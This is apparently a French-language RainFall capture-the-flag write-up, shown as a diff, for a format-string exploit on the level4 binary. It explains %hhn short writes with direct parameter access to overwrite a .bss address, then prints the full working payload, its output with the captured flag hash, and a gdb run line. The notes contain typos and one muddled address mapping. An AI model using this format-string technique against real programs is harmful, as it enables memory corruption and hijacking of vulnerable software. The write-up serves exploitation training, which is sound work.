@@ -1,1 +1,44 @@
-r < <(python -c 'print "\x10\x98\x04\x08"+"\x11\x98\x04\x08"+"\x12\x98\x04\x08"+"\x13\x98\x04\x08"+"%12$n-%13$n-%14$n-%15$n\n"')
+LIVRE: HACKING THE ART OF EXPLOITATION by Hogn ERICKSON v2
+
+On va utiliser la meme technique que sur le precedent, c'est a dire passer par un printf 
+pour changer un adresse dans le segment .bss. Mais dans cet exercice il faudra ecraser l'adresse en 4 parties car il faudrait si non ecrire sur 0x1025544 caracteres soit 16930116 caracteres. Beaucoup trop !!!!
+
+Donc avec printf on peut ecrire un "SHORT SHORT WRITES" c'est a dire ecricre uniquement sur 2 caractere ascii. (page 182)
+short = char[4]		printf: h
+short short = char[2]	printf: hh
+
+Donc on ca rajouter ce "lenght modifier a notre %n".
+De plus va utiliser le "Direct Parameter Access" (page 180). Pour acceder a l'addresse on passera par INDEX$.
+
+Donc notre parametre ressemblera a "%INDEX$hhn" afin d'ecricre le nombre de caractere print a l'adresse INDEX*4 sur la stack.
+
+
+Dans notre binaire la premiere adresse accedable se trouve a l'index 12.
+(python -c 'print "%08x."*40') | ./level4.
+
+Nous devons ecricre a l'adresse 0x8049810 la value suivante : 0x1025544 (0x01 0x02 0x55 0x44)
+
+Je vais donc ecricre un 0x1 %hhn a 0x1025544
+Je vais donc ecricre un 0x2 %hhn a 0x1125544
+Je vais donc ecricre un 0x44 %hhn a 0x1325544
+Je vais donc ecricre un 0x55 %hhn a 0x1225544
+
+Il faut que l'ecriture du nombre de caractere soit croissant car %n ne permet pas de remettre a zero.
+
+Un shema de notre string
+
+P = PADDING
+p = padding pour ecrire la bonne value (%hhn)
+	[p][%16$hhn][p][%17$hhn][ADDR3][ADDR2][pppp*14pp][%35$hhn][PPP][ADDR0][pppp*2pp][%41$hhn][PPP][ADDR1]
+writed	0x1		0x2			0x44					0x55
+
+
+level4@RainFall:~$ (python -c 'print "."+"%16$hhn"+ "."+"%17$hhn" +"\x13\x98\x04\x08" + "\x12\x98\x04\x08" + "...."*14 + ".."+ "%35$hhn"+"PPP"+ "\x10\x98\x04\x08" + "...."*2 +".."+"%41$hhn" + "PPP" + "\x11\x98\x04\x08"' )| ./level4
+............................................................PPP..........PPP�
+0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
+
+
+r < <(python -c 'print "."+"%16$hhn"+ "."+"%17$hhn" +"\x13\x98\x04\x08" + "\x12\x98\x04\x08" + "...."*14 + ".."+ "%35$hhn"+"PPP"+ "\x10\x98\x04\x08" + "...."*2 +".."+"%41$hhn" + "PPP" + "\x11\x98\x04\x08"')
+
+
+
